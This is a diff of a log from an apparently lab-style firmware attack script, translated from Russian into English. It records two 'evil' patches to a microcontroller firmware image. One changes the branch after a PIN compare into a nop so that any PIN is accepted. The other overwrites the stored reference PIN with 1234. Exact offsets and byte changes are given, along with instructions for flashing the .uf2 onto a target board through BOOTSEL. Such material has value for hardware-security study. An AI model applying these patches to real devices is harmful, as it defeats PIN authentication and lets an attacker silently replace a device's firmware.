@@ -1,25 +1,15 @@
-=== attack6: сборка злых прошивок из ../reversing/program.bin (28672 байт) ===
-образ-источник sha256[:16] = cf0d08001e05ea19
+=== attack6: build modified firmware from reversing/program.bin (28672 bytes) ===
+source image sha256[:16] = cf0d08001e05ea19
 
---- вариант: anypin ---
-  патч 0x0c8c: 22 d1 -> 00 bf
-  изменённых байт: 2 -> 0x0c8c:22->00, 0x0c8d:d1->bf
-  [anypin] 0x10000c8c: bne fail -> nop (принимается любая комбинация)
-     <- 10000C84  adds     r3, #3
-        10000C86  ldrb     r2, [r3, r4]
-        10000C88  ldrb     r3, [r5, r4]
-        10000C8A  cmp      r2, r3
-        10000C8C  nop      
-        10000C8E  movs     r0, #0x32
-        10000C90  adds     r4, #1
-        10000C92  bl       #0x1000239c
-  записано: evil_anypin.bin (28672 B, sha256[:16]=9f4ca7551e68d262), evil_anypin.uf2 (BOOTSEL drag-and-drop)
+--- variant: anypin ---
+  patch 0x0c8c: 22 d1 -> 00 bf
+  changed bytes: 2 -> 0x0c8c:22->00, 0x0c8d:d1->bf
+  Capstone is unavailable; run demo.py to verify the PIN behavior
+  written: evil_anypin.bin (28672 B, sha256[:16]=9f4ca7551e68d262), evil_anypin.uf2 (BOOTSEL drag-and-drop)
 
---- вариант: pin1234 ---
-  патч 0x5500: 03 09 05 02 -> 01 02 03 04
-  изменённых байт: 4 -> 0x5500:03->01, 0x5501:09->02, 0x5502:05->03, 0x5503:02->04
-  [pin1234] 0x100054FF: эталон PIN 3952 -> 1234
-  Примечание к старому логу: адрес 0x100054FF — таблица данных, а не инструкции Thumb; вывод дизассемблера для этих байтов не имеет смысла
-  записано: evil_pin1234.bin (28672 B, sha256[:16]=5ca3cb9649ef3f10), evil_pin1234.uf2 (BOOTSEL drag-and-drop)
+--- variant: pin1234 ---
+  patch 0x5500: 03 09 05 02 -> 01 02 03 04
+  changed bytes: 4 -> 0x5500:03->01, 0x5501:09->02, 0x5502:05->03, 0x5503:02->04
+  written: evil_pin1234.bin (28672 B, sha256[:16]=5ca3cb9649ef3f10), evil_pin1234.uf2 (BOOTSEL drag-and-drop)
 
-готово. Доставка: удержать BOOTSEL на целевой плате, подключить USB, скопировать .uf2 — прошивка подменится без единого паяльного движения
+Done. For delivery, hold BOOTSEL on the target board, connect USB, and copy the .uf2 file to replace the firmware
